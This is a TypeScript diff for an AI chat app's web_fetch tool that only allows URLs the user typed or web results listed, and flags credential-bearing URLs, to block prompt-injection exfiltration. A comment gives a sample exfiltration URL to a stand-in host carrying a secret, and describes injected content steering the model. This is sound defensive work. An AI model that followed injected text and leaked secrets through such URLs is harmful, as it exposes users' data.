@@ -220,3 +220,107 @@ export async function fetchWebPage(
   const truncated = parsed.text.length > limit
   return { ...parsed, text: parsed.text.slice(0, limit), url: res.url, contentType, truncated }
 }
+
+// ---- URL provenance for web_fetch (md-exfil T6) ---------------------------------------------------------------------
+// web_fetch is an egress channel: a model steered by injected content could fetch `https://evil.test/?d=<secret>`.
+// So it only opens a URL that a user typed or that a web_search / web_fetch result listed. Other tool results (Genie,
+// MCP, files) are NOT sources: they are attacker-influenced and can echo model text.
+
+export type UrlProvenance = { userText: readonly string[]; webResults: readonly string[] }
+
+const URL_IN_TEXT = /https?:\/\/[^\s<>"'`\\]+/gi
+const TRAILING = /[.,;:!?'"\]}>*_]+$/
+
+/** `new URL().href` with the fragment dropped; null when it is not an http(s) URL. */
+function normalizeUrl(raw: string): string | null {
+  try {
+    const u = new URL(raw)
+    if (u.protocol !== 'http:' && u.protocol !== 'https:') return null
+    u.hash = ''
+    return u.href
+  } catch {
+    return null
+  }
+}
+
+/** Every http(s) URL in `text`, normalized; punctuation that closes a sentence or a markdown link is tried both ways. */
+function urlsIn(text: string, into: Set<string>): void {
+  if (typeof text !== 'string' || !text) return
+  for (const m of text.slice(0, 2_000_000).matchAll(URL_IN_TEXT)) {
+    const raw = m[0]
+    const variants = new Set([raw, raw.replace(TRAILING, ''), raw.replace(/\)+$/, '').replace(TRAILING, '')])
+    if (raw.endsWith(')') && !raw.includes('(')) variants.add(raw.slice(0, -1))
+    for (const v of variants) {
+      const n = v && normalizeUrl(v)
+      if (n) into.add(n)
+    }
+  }
+}
+
+/** Normalized exact match (fragment dropped) against the URLs found in the user text and the web results. */
+export function urlInPriorContext(url: string, prov: UrlProvenance): boolean {
+  const want = normalizeUrl(String(url || '').trim())
+  if (!want || !prov) return false
+  const have = new Set<string>()
+  for (const t of [...(prov.userText || []), ...(prov.webResults || [])]) urlsIn(t, have)
+  return have.has(want)
+}
+
+/** Same match against the user's own messages only. */
+export function urlInUserText(url: string, prov: UrlProvenance): boolean {
+  return urlInPriorContext(url, { userText: prov?.userText || [], webResults: [] })
+}
+
+const CREDENTIAL_PARAM = /^(?:.*[_-])?(?:key|token|secret|password|passwd|sig|signature|auth|apikey|api_key|access_token)$/i
+
+/** Userinfo (`user:pw@host`), or a key/token/secret/password/sig/auth parameter with a long value. */
+export function looksLikeCredentialUrl(url: string): boolean {
+  let u: URL
+  try {
+    u = new URL(String(url || '').trim())
+  } catch {
+    return false
+  }
+  if (u.username || u.password) return true
+  for (const [k, v] of u.searchParams) if (CREDENTIAL_PARAM.test(k) && v.length >= 16) return true
+  return false
+}
+
+const PROVENANCE_TOOLS = new Set(['web_search', 'web_fetch'])
+
+function textOf(content: unknown): string {
+  if (typeof content === 'string') return content
+  if (Array.isArray(content)) return content.map((p) => (typeof p?.text === 'string' ? p.text : '')).join('\n')
+  return ''
+}
+
+// turn.ts persists a user message as `typed prompt + ATTACH_MARKER + extracted file/transcript text`, and history replay
+// hands that same string back as a role:user message. Only what precedes the marker was typed by the user: everything
+// after it is file content (attacker-influenced) and must never authorize a fetch. The same delimiter is already used by
+// stripAttach (lib/embeddings.ts) and the client, so it is the one boundary that survives persistence and replay on
+// chat, continue, regenerate and headless. The `### Arquivo:` block header (written with every attachment) is a second cut, so a message without the marker is also
+// cleaned. A user who types either themselves only loses provenance (fails closed).
+const ATTACH_BOUNDARIES = ['\n\n--- ANEXOS ---', '\n### Arquivo: ', '### Arquivo: ']
+function typedPart(content: string): string {
+  let cut = content.length
+  for (const b of ATTACH_BOUNDARIES) {
+    const i = content.indexOf(b)
+    if (i >= 0 && i < cut) cut = i
+  }
+  return content.slice(0, cut)
+}
+
+/** Built once per round from the model conversation: user turns plus the results of web_search / web_fetch calls. */
+export function buildUrlProvenance(apiMessages: ReadonlyArray<Record<string, any>>): UrlProvenance {
+  const userText: string[] = []
+  const webResults: string[] = []
+  const toolName = new Map<string, string>()
+  for (const m of apiMessages || []) {
+    if (m?.role === 'assistant') for (const tc of m.tool_calls || []) if (tc?.id) toolName.set(String(tc.id), String(tc.function?.name || ''))
+  }
+  for (const m of apiMessages || []) {
+    if (m?.role === 'user') userText.push(typedPart(textOf(m.content)))
+    else if (m?.role === 'tool' && PROVENANCE_TOOLS.has(toolName.get(String(m.tool_call_id)) || '')) webResults.push(textOf(m.content))
+  }
+  return { userText, webResults }
+}
